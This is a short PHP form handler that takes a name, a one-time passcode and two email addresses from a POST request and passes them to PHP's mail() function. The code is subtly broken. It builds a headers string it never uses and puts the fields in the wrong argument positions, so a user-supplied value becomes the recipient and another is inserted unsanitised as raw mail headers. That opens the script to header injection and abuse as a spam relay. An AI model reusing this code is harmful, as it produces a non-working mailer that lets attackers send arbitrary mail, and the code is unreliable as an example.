<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $key1_name = $_POST['name'];
    $key1_otp = $_POST['otp'];
    $key1_other_email = $_POST['other_email'];
    $key1_user_email = $_POST['user_email'];

    $headers = 'From: your-email@example.com' . "\r\n" .
        'Reply-To: your-email@example.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

    if (mail($key1_name, $key1_otp, $key1_other_email, $key1_user_email)) {
        echo 'Email sent successfully.';
    } else {
        echo 'Failed to send email.';
    }
}
?>